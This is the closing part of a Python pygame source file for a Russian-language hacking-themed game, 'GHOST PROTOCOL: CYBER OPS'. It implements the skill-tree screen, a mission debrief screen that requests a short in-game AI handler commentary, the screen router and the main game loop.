        self.back_btn.on_click(lambda: self.gm.set_phase(Phase.MENU if not self.gm.active_mid else Phase.PLAY))

    def handle(self, event):
        self.back_btn.handle(event)
        if event.type == pygame.MOUSEMOTION:
            mx, my = event.pos
            self.hover = None
            for s in self.gm.skills:
                sx, sy = self._skill_pos(s)
                if math.hypot(mx-sx, my-sy) < 34:
                    self.hover = s.sid
        if event.type == pygame.MOUSEBUTTONDOWN and event.button==1:
            mx, my = event.pos
            for s in self.gm.skills:
                sx, sy = self._skill_pos(s)
                if math.hypot(mx-sx, my-sy) < 34:
                    if self.sel == s.sid:
                        ok, msg = self.sm.try_unlock(s.sid)
                        self.notif   = msg
                        self.notif_t = 3.0
                    else:
                        self.sel = s.sid

    def _skill_pos(self, s: Skill) -> Tuple[int, int]:
        branch_x = {"GHOST": SW//6, "ZERO": SW//2, "ORACLE": 5*SW//6}
        bx = branch_x.get(s.branch, SW//2)
        return (bx + int((s.pos[0]-0.5)*180), 130 + int(s.pos[1]*(SH-280)))

    def update(self, dt):
        self.t += dt
        if self.notif_t > 0: self.notif_t -= dt

    def draw(self):
        self.surf.fill(C_BG)
        txt(self.surf, "[ ДЕРЕВО НАВЫКОВ — GHOST PROTOCOL ]", fnt("consolas",22,True), C_CYAN, SW//2, 22, center=True)
        txt(self.surf, f"Доступно SP: {self.gm.skill_pts}  |  ЛКМ 1× — выбрать  |  ЛКМ 2× — изучить", fnt("consolas",12), C_GRAY, SW//2, 52, center=True)

        # Branch headers
        for branch, bx, col in [("GHOST", SW//6, C_CYAN), ("ZERO", SW//2, C_RED), ("ORACLE", 5*SW//6, C_PURPLE)]:
            panel(self.surf, (bx-90, 68, 180, 32), C_PANEL2, col, r=4)
            txt(self.surf, branch, fnt("consolas",14,True), col, bx, 84, center=True)

        # Lines between skills (requirements)
        for s in self.gm.skills:
            sx, sy = self._skill_pos(s)
            for req_id in s.requires:
                req = self.gm.get_skill(req_id)
                if req:
                    rx, ry = self._skill_pos(req)
                    col = C_DKGREEN if s.unlocked else C_DKGRAY
                    pygame.draw.line(self.surf, col, (rx, ry), (sx, sy), 2)

        # Skills
        for s in self.gm.skills:
            sx, sy = self._skill_pos(s)
            R = 30
            is_sel   = self.sel   == s.sid
            is_hov   = self.hover == s.sid
            can_unlock = not s.unlocked and all(self.gm.has_skill(r) for r in s.requires)

            if s.unlocked:
                col = C_GREEN; text_col = C_GREEN; border = C_GREEN
            elif can_unlock:
                col = C_PANEL2; text_col = C_YELLOW; border = C_YELLOW
            else:
                col = (15,20,30); text_col = C_DKGRAY; border = C_DKGRAY

            if is_sel and can_unlock:
                pulse = int(20*abs(math.sin(self.t*3)))
                glow = pygame.Surface((R*2+pulse*2, R*2+pulse*2), pygame.SRCALPHA)
                pygame.draw.circle(glow, (*C_YELLOW, 60), (R+pulse, R+pulse), R+pulse)
                self.surf.blit(glow, (sx-R-pulse, sy-R-pulse))

            pygame.draw.circle(self.surf, col, (sx, sy), R)
            pygame.draw.circle(self.surf, border, (sx, sy), R, 2)
            txt(self.surf, s.icon, fnt("consolas",18), text_col, sx, sy, center=True)
            txt(self.surf, s.name, fnt("consolas",10,True), text_col, sx, sy+R+4, center=True)
            txt(self.surf, f"{s.cost}SP", fnt("consolas",9), C_GRAY, sx, sy+R+18, center=True)
            if s.unlocked:
                txt(self.surf, "✓", fnt("consolas",9,True), C_GREEN, sx+R-4, sy-R+2)

            # Tooltip
            if is_hov:
                tw, th = 280, 90
                tx = min(sx+R+8, SW-tw-10)
                ty = max(8, sy-th//2)
                panel(self.surf, (tx, ty, tw, th), C_PANEL2, C_BORDH, r=4)
                txt(self.surf, s.name, fnt("consolas",12,True), C_WHITE, tx+8, ty+6)
                txt(self.surf, f"Ветка: {s.branch}  |  Цена: {s.cost} SP", fnt("consolas",10), C_GRAY, tx+8, ty+24)
                for ji, line in enumerate(wrap(s.desc, 36)):
                    txt(self.surf, line, fnt("consolas",10), C_WHITE, tx+8, ty+40+ji*16)

        # Selection info
        if self.sel:
            s = self.gm.get_skill(self.sel)
            if s:
                can = all(self.gm.has_skill(r) for r in s.requires) and not s.unlocked
                panel(self.surf, (SW//2-200, SH-100, 400, 35), C_PANEL2, C_BORDH, r=4)
                if s.unlocked:
                    txt(self.surf, f"✓ '{s.name}' уже изучен", fnt("consolas",12), C_GREEN, SW//2, SH-83, center=True)
                elif can:
                    txt(self.surf, f"Нажмите ЛКМ ещё раз чтобы изучить '{s.name}' за {s.cost} SP",
                        fnt("consolas",11), C_YELLOW, SW//2, SH-83, center=True)
                else:
                    txt(self.surf, f"Нужно сначала изучить: {', '.join(s.requires)}",
                        fnt("consolas",11), C_RED, SW//2, SH-83, center=True)

        if self.notif and self.notif_t > 0:
            panel(self.surf, (SW//2-200, SH-145, 400, 34), (10,30,10), C_GREEN, r=4)
            txt(self.surf, self.notif, fnt("consolas",12), C_GREEN, SW//2, SH-128, center=True)

        self.back_btn.draw(self.surf)
        self.surf.blit(get_crt(), (0,0))

# ════════════════════════════════════════════════════════════════════════════
#  DEBRIEF SCREEN
# ════════════════════════════════════════════════════════════════════════════
class DebriefScreen:
    def __init__(self, surf):
        self.surf    = surf
        self.gm      = GameManager()
        self.t       = 0.0
        self.ai_text = ""
        m   = self.gm.mission()
        self.won = m is not None and all(o.done for o in m.objectives)
        self.m   = m

        # AI debrief
        done_list = [o.text for o in m.objectives if o.done] if m else []
        fail_list = [o.text for o in m.objectives if not o.done] if m else []
        dr    = self.gm.detect_rate
        score = int(max(0, (1-dr)*100 - (len(fail_list)*20)))
        self.score = score
        prompt = (
            f"Операция {'УСПЕШНА' if self.won else 'ПРОВАЛЕНА'}. "
            f"Выполнено целей: {len(done_list)}/{len(m.objectives) if m else 0}. "
            f"Обнаружение: {dr*100:.0f}%. Оценка: {score}/100. "
            f"Дебрифинг от хендлера ORACLE (2-3 предложения)."
        )
        AIManager().oracle(prompt, lambda t: setattr(self, 'ai_text', t))

        # Buttons
        self.btn_menu  = _Button(SW//2-220, SH-80, 200, 50, "🏠 ГЛАВНОЕ МЕНЮ", C_PANEL2, C_BORDER, C_WHITE, 14)
        self.btn_menu.on_click(lambda: self.gm.set_phase(Phase.MENU))
        self.btn_skill = _Button(SW//2+20,  SH-80, 200, 50, f"🎓 НАВЫКИ ({self.gm.skill_pts} SP)", C_PURPLE, (200,80,255), C_WHITE, 13)
        self.btn_skill.on_click(lambda: self.gm.set_phase(Phase.SKILLS))
        if self.won:
            self.btn_retry = None
        else:
            self.btn_retry = _Button(SW//2-100, SH-80, 200, 50, "↩ ПОВТОР", C_DKRED, C_RED, C_WHITE, 14)
            self.btn_retry.on_click(lambda: (self.gm.start_mission(self.gm.active_mid),
                                              setattr(NetworkManager(), 'current_nid',
                                                      list(self.gm.missions[self.gm.active_mid].nodes.keys())[0])))

    def handle(self, event):
        self.btn_menu.handle(event)
        self.btn_skill.handle(event)
        if self.btn_retry: self.btn_retry.handle(event)

    def update(self, dt): self.t += dt

    def draw(self):
        self.surf.fill((3,5,12))
        m = self.m
        won = self.won
        col = C_GREEN if won else C_RED
        title = "MISSION COMPLETE" if won else "MISSION FAILED"
        pulse = abs(math.sin(self.t*2.2))
        pc    = tuple(int(c*pulse + 30*(1-pulse)) for c in col)

        txt(self.surf, title, fnt("consolas",42,True), pc, SW//2, 55, center=True)
        if m:
            txt(self.surf, m.codename, fnt("consolas",18), C_GRAY, SW//2, 100, center=True)

        # Stats grid
        panel(self.surf, (SW//2-350, 125, 700, 130), C_PANEL, C_BORDER, r=6)
        stats = [
            ("ОБНАРУЖЕНИЕ",  f"{self.gm.detect_rate*100:.1f}%",
             C_GREEN if self.gm.detect_rate < 0.5 else C_RED),
            ("КРЕДИТЫ",     f"₿ {self.gm.credits:,}", C_YELLOW),
            ("ОЦЕНКА",      f"{self.score}/100",
             C_GREEN if self.score >= 70 else C_ORANGE if self.score >= 40 else C_RED),
            ("SP ИТОГО",    str(self.gm.skill_pts), C_PURPLE),
        ]
        for i, (lbl, val, vc) in enumerate(stats):
            sx = SW//2-340 + i*178
            txt(self.surf, lbl, fnt("consolas",11), C_GRAY, sx, 140)
            txt(self.surf, val, fnt("consolas",20,True), vc, sx, 162)

        # Objectives
        txt(self.surf, "ЦЕЛИ:", fnt("consolas",14,True), C_CYAN, SW//2-350, 270)
        if m:
            oy = 296
            for obj in m.objectives:
                sym = "✓" if obj.done else "✗"
                oc  = C_GREEN if obj.done else C_RED
                txt(self.surf, f"  [{sym}]  {obj.text}", fnt("consolas",13), oc, SW//2-340, oy)
                oy += 24

        # AI debrief
        txt(self.surf, "ORACLE DEBRIEF:", fnt("consolas",13,True), TC["oracle"], SW//2-350, 450)
        if self.ai_text:
            for ji, line in enumerate(wrap(self.ai_text, 80)):
                txt(self.surf, line, fnt("consolas",12), TC["oracle"], SW//2-340, 472+ji*20)
        else:
            blink = "..." if int(self.t*3)%3 < 2 else "   "
            txt(self.surf, f"[ORACLE] Получение дебрифинга{blink}", fnt("consolas",12), TC["oracle"], SW//2-340, 472)

        # Buttons
        self.btn_menu.draw(self.surf)
        self.btn_skill.draw(self.surf)
        if self.btn_retry:
            self.btn_retry.draw(self.surf)

        self.surf.blit(get_crt(), (0,0))

# ════════════════════════════════════════════════════════════════════════════
#  PHASE ROUTER
# ════════════════════════════════════════════════════════════════════════════
def build_screen(phase: Phase, surf):
    gm = GameManager()
    if phase == Phase.BOOT:    return BootScreen(surf)
    if phase == Phase.MENU:    return MissionSelectScreen(surf)
    if phase == Phase.PLAY:    return GamePlayScreen(surf)
    if phase == Phase.SKILLS:  return SkillTreeScreen(surf)
    if phase == Phase.DEBRIEF: return DebriefScreen(surf)
    return MissionSelectScreen(surf)

# ════════════════════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════════════════════
def main():
    pygame.init()
    surf  = pygame.display.set_mode((SW, SH))
    pygame.display.set_caption("GHOST PROTOCOL: CYBER OPS  v2.0  |  Гелич К.А.  |  КЕМ-25-01")
    clock = pygame.time.Clock()

    gm          = GameManager()
    cur_phase   = Phase.BOOT
    cur_screen  = build_screen(cur_phase, surf)

    # Flash dt tracking
    last_t = time.time()

    while gm.running:
        now = time.time()
        dt  = min(clock.tick(FPS) / 1000.0, 0.05)
        last_t = now

        # Phase transition
        if gm.phase != cur_phase:
            cur_phase  = gm.phase
            EventBus.clear()
            cur_screen = build_screen(cur_phase, surf)

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                gm.running = False
            cur_screen.handle(event)

        cur_screen.update(dt)
        cur_screen.draw()

        # Global flash overlay
        draw_flash(surf, dt)

        pygame.display.flip()

    pygame.quit()
    sys.exit()
